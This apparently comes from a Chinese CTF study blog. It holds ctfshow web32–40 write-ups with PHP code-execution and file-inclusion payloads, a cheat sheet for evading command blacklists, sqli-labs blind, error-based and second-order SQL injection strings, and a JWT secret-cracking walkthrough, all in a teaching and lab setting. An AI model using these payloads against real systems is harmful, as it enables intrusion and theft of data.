class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据源代码可知，反引号，分号，括号都不能用<br>没有括号就不能使用上一题的eval(),所以要用没有括号的函数，比如include<br>分号可以用？&gt;代替<br>还需要配合使用<strong>伪协议</strong>，通过特定的通道读取文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>这里我们获得了一个base64的数据<img src="/images/666.png" alt="base64"></p><p><a href="https://c.runoob.com/front-end/693/">base64解码</a></p><p>获得flag！</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了一个”<br>使用上一题的方法一样可以做出来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>同样的base64加密，解码获得flag</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>多过滤了一个冒号，也不影响我们使用上面的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?&gt;&amp;a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>代码懒得帖了<br>ps:此处多过滤了&lt;&#x3D;，与上题题解一样</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>代码懒得贴了，和前几题类似<br>ps:此处过滤了数字</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过data:&#x2F;&#x2F;text&#x2F;plain协议来进行漏洞利用</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>ctrl+u以获得flag!</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>比上一题多过滤了php，file<br>使用上一题的方法就行，需要把php换成&#x3D; 即<?=内容?></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span> system(<span class="hljs-string">&quot;cat fla?.ph?&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>加了个后缀.php，但还是不影响用data协议</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/?c=data://text/plains,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plains</span>,&lt;<span class="hljs-string">?=</span>system(<span class="hljs-string">&quot;cat fla?.php&quot;</span>);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>只是后面多了个.php<br><img src="/images/678.png"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>在url中输入</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/?c=show<span class="hljs-constructor">_source(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure><p>得到flag<br>emmm~并不知道这是什么原理，后续跟进🥹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行绕过小技巧</title>
    <link href="/2023/04/19/minlinzhixinraoguo/"/>
    <url>/2023/04/19/minlinzhixinraoguo/</url>
    
    <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h4 id="windows-下："><a href="#windows-下：" class="headerlink" title="windows 下："></a>windows 下：</h4><blockquote><ul><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h4 id="Linux-下："><a href="#Linux-下：" class="headerlink" title="Linux 下："></a>Linux 下：</h4><blockquote><ul><li><strong>;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul><li><strong>&gt;</strong> &lt; &lt;&gt; 重定向符</li><li>%09(需要php环境)</li><li>${IFS}</li><li>$IFS$9</li><li>{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能</li><li>%20</li><li>%09</li></ul><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><blockquote><ul><li>system()</li><li>passthru()</li><li>exec()</li><li>shell_exec()</li><li>popen()</li><li>proc_open()</li><li>pcntl_exec()</li><li>反引号 同shell_exec()</li></ul></blockquote><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><blockquote><p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p></blockquote><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><blockquote><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d<br>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p></blockquote><h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><blockquote><p>c””at fl’’ag</p></blockquote><h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><blockquote><p>c\at fl\ag</p></blockquote><h4 id="正则-假设-x2F-bin-x2F-cat-test-是一个目录"><a href="#正则-假设-x2F-bin-x2F-cat-test-是一个目录" class="headerlink" title="正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)"></a>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</h4><blockquote><p>&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’</p></blockquote><h4 id="1、-2等和"><a href="#1、-2等和" class="headerlink" title="$1、$2等和$@"></a>$1、$2等和$@</h4><blockquote><ul><li>$# 是传给脚本的参数个数</li><li>$0 是脚本本身的名字</li><li>$1 是传递给该shell脚本的第一个参数</li><li>$2 是传递给该shell脚本的第二个参数</li><li>$@ 是传给脚本的所有参数的列表</li><li>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</li><li>$$ 是脚本运行的当前进程ID号</li><li>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</li></ul></blockquote><h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p></blockquote><h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><blockquote><p>cat$IFS$9<code>ls</code><br>cat$IFS$9$(ls)</p></blockquote><p>(内联，就是将&#96;&#96;或$()内命令的输出作为输入执行)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周报告</title>
    <link href="/2023/04/19/my-blogneirong/"/>
    <url>/2023/04/19/my-blogneirong/</url>
    
    <content type="html"><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在通关sqllabs第9关与第10关时我们知道了时间盲注这一概念，<br>用时间盲注来判断注入点是否正确，使用sleep延迟函数。<br>if()函数条件判断函数<br>if(a,b,c)   if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;<br>sleep()函数网页延迟n秒后，输出结果<br>left（）函数             从左边数，取几个数<br>例如：left（abcdef，3）  取3位左边的数，就是abc  </p><ol><li>判断注入点：?id&#x3D;1 and sleep(10)–+ 如若页面加载则判断正确，否则尝试其他</li><li>爆库：?id&#x3D;1’ and if (length(database()) &#x3D; 8 ,sleep(4),1)–+ 如若延时则正确，?id&#x3D;1’ and If((substr(database(),1,1)&#x3D;’s’),sleep(5),1)–+ 挨个尝试找出八个字符库名security</li><li>爆表名：?id&#x3D;1’ and If((substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,1))&#x3D;‘u‘,sleep(4),1)–+ 等于users</li><li>爆字段：?id&#x3D;1’ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)–+</li><li>爆数据：?id&#x3D;1’ and If( (substr((select username from users limit 0,1),1,1))&#x3D;’a’,sleep(4),1)–+</li></ol><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在sqllabs 第13关中，可以测试出闭合点，但没有回显位，无法重复11，12题中的操作，所以这里我们尝试使用报错注入<br>1’)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br><strong>虽然报错，但我们知道了库名为security</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1) #<br><strong>再求得表名</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br><strong>再求得字段</strong><br>可求得username 和 password</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>在24关中需要用到二次注入的原理，二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户 输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>第一步：插入恶意数据</strong><br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br><strong>第二步：引用恶意数据</strong><br>开发者默认存入数据库的数据都是安全的，在进行查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>在25，26关都过滤了or和and 所以遇到有or或and的地方需要双写，<br>例：information-&gt;information&amp;&amp;password-&gt;passwoorrd<br>但26关也过滤掉了空格和注释符，这时可以采用报错法求得，空格可用“%a0” 或 “%0b” 替代空格，同时可以使用）来代替空格的划分作用，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。<br><strong>管道符（Linux管道命令操作符）：</strong><br><img src="/./images/heiheihei.jpg" alt="Linux管道命令操作符"><br>Linux-&gt;ls-&gt;list-&gt;列表-&gt;显示指定工作目录下的内容<br>Linux-&gt;cat-&gt;用于连接文件并打印到标准输出设备上</p><h2 id="filter伪协议"><a href="#filter伪协议" class="headerlink" title="filter伪协议"></a>filter伪协议</h2><p>php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等。官方解释为：php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。<br>Filter协议的一般语法为：php:&#x2F;&#x2F;filter&#x2F;过滤器|过滤器&#x2F;resource&#x3D;待过滤的数据流<br><strong>通过php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D; 利用LFI来查看源码</strong><br><a href="https://blog.csdn.net/qq_29419013/article/details/81201494">filter详细信息</a><br><a href="https://zhuanlan.zhihu.com/p/50445145">filter详细信息</a></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>如果服务器传入数据库的数据是gbk等宽字节编码，可以在特殊字符之前增加一个十六进制字节，和转义符构成一个汉字字符，从而把转义符吃掉。<br><a href="https://blog.csdn.net/weixin_42040292/article/details/90719507">宽字节注入</a><br><strong>Referer: 服务器伪造</strong><br><strong>X-Forwarded-For:用于修改ip</strong></p><p><strong>常见的网站源码备份文件后缀:</strong></p><ul><li>tar.gz，zip，rar，tar<br><strong>常见的网站源码备份文件名：</strong><br>web，website，backup，back，www，wwwroot，temp<br><strong>常见的备份文件后缀名有：</strong></li><li>.git .svn .swp .~ .bak .bash_history</li></ul><h2 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h2><p> <strong>序列化</strong>是将变量转换为可保存或传输的字符串的过程；<strong>反序列化</strong>就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p> <strong>弱比较：</strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>常见漏洞</title>
    <link href="/2023/01/26/%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/26/%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="JWT伪造漏洞"><a href="#JWT伪造漏洞" class="headerlink" title="JWT伪造漏洞"></a>JWT伪造漏洞</h1><h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><p>JSON Web Token(JWT)是一个开放标准(RFC 7519),它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全的传输信息。该信息可以被验证和信任，因为它是数字签名的。</p><h2 id="什么时候应该用JSON-Web-Tokens"><a href="#什么时候应该用JSON-Web-Tokens" class="headerlink" title="什么时候应该用JSON Web Tokens"></a>什么时候应该用JSON Web Tokens</h2><p>下列场景中使用JSON Web Token是很有用的：</p><ul><li><p>Authorization(授权)：这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</p></li><li><p>Information Exchange(信息交换)：对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</p></li></ul><h2 id="JSON-Web-Token-的结构"><a href="#JSON-Web-Token-的结构" class="headerlink" title="JSON Web Token 的结构"></a>JSON Web Token 的结构</h2><p><img src="/images/874963-20180709124807031-664967381.png"><br>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>因此，一个典型的JWT看起来是这个样子的：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xxxx<span class="hljs-selector-class">.yyyyy</span>.zzzzz<br></code></pre></td></tr></table></figure><p>接下来，具体看一下每一部分：</p><p><strong>Header</strong></p><p>header典型的由两部分组成：token的类型(“JWT”)和算法名称(比如：HMAC SHA256或者RSA等等)。<br>例如：<br><img src="/images/874963-20180707143936465-1142974441.png"><br>然后，用Base64对这个JSON编码就得到JWT的第一部分</p><p><strong>Payload</strong></p><p>JWT的第二部分是payload，它包含声明(要求)。声明是关于实体(通常是用户)和其它数据的声明。声明有三种类型：registered，public和private。</p><ul><li><p>Registered claims: 这里有一组预定义的声明，它们不是强制的，但是推荐。比如:iss(issuer),exp(expiration time), sub(subject),aud(audience)等。</p></li><li><p>Public claims: 可以随意定义。</p></li><li><p>Private claims: 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</p></li></ul><p>下面是一个例子：<br><img src="/images/874963-20180707144153274-292205768.png"><br>对payload进行Base64编码就得到JWT的第二部分</p><p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p><p><strong>Sinature</strong></p><p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个密钥，签名算法是header中指定的那个，然后对它们签名即可。<br>例如</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">HMACSHA256(<span class="hljs-params">base64UrlEncode</span>(<span class="hljs-params">header</span>)</span> + <span class="hljs-string">&quot;.&quot;</span> + base64<span class="hljs-constructor">UrlEncode(<span class="hljs-params">payload</span>)</span>, secret)<br></code></pre></td></tr></table></figure><p>签名是用于验证消息在传递过程中有没有被更改，并且，由于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。<br>官网解码图<br><img src="/images/874963-20180707150229764-2037235703.png"><br>官网地址<a href="https://jwt.io/">https://jwt.io/</a><br>密钥的取得方法我们由一个题来引入<br><strong>[CISCN2019 华北赛区 Day1 Web2]ikun</strong><br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png"><br>从cookies中抓出JWT数据<br>放到官网里分析<br><img src="/images/YUHH2KYYY0T1NMKK4Q.png"><br>是我们注册的数据没错<br>现在要做的就是破解密钥<br>这里有个脚本<a href="https://gitcode.com/mirrors/brendan-rius/c-jwt-cracker/overview">c-jwt-cracker</a><br>我使用的是kali，攻击jwt<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png"><br>这样我们就获得了我们的密钥，然后将密钥填入密匙位置在官网生成一个新的JWT<br><a href="/buuctf_web.md">原题链接</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
